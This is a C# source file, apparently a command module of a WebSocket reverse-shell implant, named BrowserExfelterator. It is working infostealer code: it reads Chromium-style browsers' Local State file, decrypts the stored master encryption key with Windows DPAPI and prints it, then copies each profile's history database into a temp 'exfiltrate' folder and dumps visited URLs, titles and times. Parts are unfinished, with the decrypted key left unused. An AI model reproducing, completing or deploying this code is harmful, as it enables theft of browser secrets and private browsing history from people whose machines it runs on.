using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.Json;
using WebSocketReverseShellDotNet.utils;
using System.Security.Cryptography;
using System.Data.SQLite;


namespace WebSocketReverseShellDotNet.service.commands
{
    internal class BrowserExfelterator : Command
    {
        public string ExecuteCommand(string command)
        {
            foreach (String browserHome in Constants.LIST_OF_BROWSER_LOCATIONS)
            {
                if (!OSUtil.DirectoryExists(browserHome)) continue;
                byte[] encryptionKey = getEncryptionKey(browserHome);

                processProfile(browserHome);


            }
            return "";
        }

        private byte[]  getEncryptionKey(String browserHome)
        {

            try {
                string localStateFileLocation = browserHome + Constants.ENCRYPTION_KEY_BROWSER_DB;
                string localStateFileLocationExpandedPath = Environment.ExpandEnvironmentVariables(localStateFileLocation);

                if (!OSUtil.FileExists(localStateFileLocation)) return [];


                string jsonContent = File.ReadAllText(localStateFileLocationExpandedPath);

                // Deserialize the JSON content into a dynamic object
 /*               dynamic? localState = JsonSerializer.Deserialize<dynamic>(jsonContent);*/

  
                JsonDocument jsonDocument = JsonDocument.Parse(jsonContent);

                // Assuming you are checking a property named "os_crypt"
                JsonElement osCryptElement;
                if (jsonDocument.RootElement.TryGetProperty("os_crypt", out osCryptElement))
                {
                    // Assuming "os_crypt" is an object with a property "encrypted_key"
                    JsonElement encryptedKeyElement;
                    if (osCryptElement.TryGetProperty("encrypted_key", out encryptedKeyElement))
                    {
                        // Decode the base64-encoded key
                        byte[] masterKeyBytes = Convert.FromBase64String(
                            encryptedKeyElement.GetString());

                        // Trim the first 5 bytes from the decoded key
                        byte[] trimmedKey = new byte[masterKeyBytes.Length - 5];
                        Array.Copy(masterKeyBytes, 5, trimmedKey, 0, trimmedKey.Length);

                        // Decrypt the key using ProtectedData
                        byte[] decryptedKeyBytes = ProtectedData.Unprotect(trimmedKey, null, DataProtectionScope.LocalMachine);

                        // Convert the decrypted key to a string if needed
                        string decryptedKeyString = Encoding.UTF8.GetString(decryptedKeyBytes);

                        Console.WriteLine($"decryptedKeyString: {decryptedKeyString}");

                        /*string base64EncodedKey = encryptedKeyElement.GetString();
                        Console.WriteLine($"The encrypted key is: {base64EncodedKey}");

                        // Decode the base64-encoded key
                        byte[] decodedKey = Convert.FromBase64String(base64EncodedKey);

                        string decodedString = Encoding.UTF8.GetString(decodedKey);
                        
                        string modifiedMasterKey = SubstringFromIndex(decodedString, 5);
                        Console.WriteLine($"decoded Master Key: {modifiedMasterKey}");
                        // Use the master key as needed
                        *//*Console.WriteLine($"Decrypted Master Key: {decodedString}");*//*


                        byte[] decryptedData =  ProtectedData.Unprotect(Encoding.UTF8.GetBytes(modifiedMasterKey)
                            , null, DataProtectionScope.CurrentUser);

                        string masterKey = Encoding.UTF8.GetString(decryptedData);
                        Console.WriteLine($"masterKey: {masterKey}");*/

                        return decryptedKeyBytes;


                    }
                    else
                    {
                        Console.WriteLine("The 'encrypted_key' property does not exist in the 'os_crypt' object.");
                    }
                }
                else
                {
                    Console.WriteLine("The 'os_crypt' property does not exist in the JSON document.");
                }

            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                return [];

            }
            

            return [];
        }
  
        static string SubstringFromIndex(string input, int startIndex)
        {
            // Check if the startIndex is within the valid range
            if (startIndex >= 0 && startIndex < input.Length)
            {
                return input.Substring(startIndex);
            }
            else
            {
                // Handle invalid startIndex (out of range)
                Console.WriteLine("Invalid startIndex");
                return null;
            }
        }




            private void processProfile(String browserHome)
        {
            foreach (string browserProfile in Constants.LIST_OF_PROFILE_LOCATIONS)
            {
                String profilePath = browserHome + browserProfile;

                if (!OSUtil.DirectoryExists(profilePath)) continue;
                exfilterateUserData(profilePath);

            }
        }

        private void exfilterateUserData(String profilePath)
        {
            String profileDir = Environment.ExpandEnvironmentVariables(profilePath);
            String historyDb = profileDir + Constants.HISTORY_BROWSER_DB;
            string folderPath = $"{OSUtil.GetSystemTempDir}{Constants.EXFILTRATE_FOLDER}";
            Directory.CreateDirectory(folderPath);

            historyDb = OSUtil.CopyFileWithNumberPreAppended(historyDb, folderPath , 1);
            
            if (!String.IsNullOrEmpty(historyDb))
            {
                string connectionString = $"Data Source={historyDb};Version=3;";

                ProcessWebHistoryData(connectionString);
            }


        }


        static void ProcessWebHistoryData(string connectionString)
        {
            using (SQLiteConnection connection = new SQLiteConnection(connectionString))
            {
                connection.Open();

                using (SQLiteCommand command = new SQLiteCommand("SELECT url, title, last_visit_time FROM urls", connection))
                {
                    using (SQLiteDataReader reader = command.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            string url = reader["url"].ToString();
                            string title = reader["title"].ToString();
                            long lastVisitTime = Convert.ToInt64(reader["last_visit_time"]);

                            // Check if any of the fields is null or empty
                            if (string.IsNullOrEmpty(url) || string.IsNullOrEmpty(title) || lastVisitTime == 0)
                            {
                                continue;
                            }

                            // Process the valid data
                            Console.WriteLine($"URL: {url}, Title: {title}, Last Visit Time: {lastVisitTime}");
                        }
                    }
                }

            }
        }

    }
}
